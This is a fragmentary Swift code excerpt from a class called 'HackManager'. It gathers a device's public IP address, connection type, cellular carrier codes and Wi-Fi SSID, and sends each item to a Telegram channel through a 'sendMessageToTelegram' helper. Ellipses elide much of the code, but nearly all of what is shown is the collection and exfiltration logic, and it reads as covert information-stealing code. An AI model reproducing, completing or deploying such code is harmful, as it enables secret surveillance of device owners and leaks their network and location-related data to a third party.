...
public class HackManager {
    ...
    private func getIpAddress(completion: @escaping (String) -> Void) {
        DispatchQueue.global(qos: .background).async {
            AF.request("https://ipinfo.io/ip").response { response in
    ...
    public func sendMessage() {
        ...
        monitor.pathUpdateHandler = { path in
            if path.usesInterfaceType(.wifi) {
                connection = "Connected via Wi-Fi"
            } else if path.usesInterfaceType(.cellular) {
                connection = "Connected via Cellular"
            } else {
                connection = "Other/No Connection"
            }
            dispatchGroup.leave()
        }
        ...
        dispatchGroup.notify(queue: .main) { [self] in
            ...
            dispatchGroup.notify(queue: .main) {
                ...
                if let carrier = networkInfo.serviceSubscriberCellularProviders?.values.first {
                    ...
                    Mobile Country Code: \(carrier.mobileCountryCode ?? "Unknown")
                    Mobile Network Code: \(carrier.mobileNetworkCode ?? "Unknown")
                    """
                    
                    print(info)
                    self.sendMessageToTelegram(message: info)
                }
                
                if let ssid = self.getSSID() {
                    print(ssid)
                    self.sendMessageToTelegram(message:  "SSID: \(ssid)")
                }
                
                if let connection {
                    print(connection)
                    self.sendMessageToTelegram(message: connection)
                }
            }
        }
    }
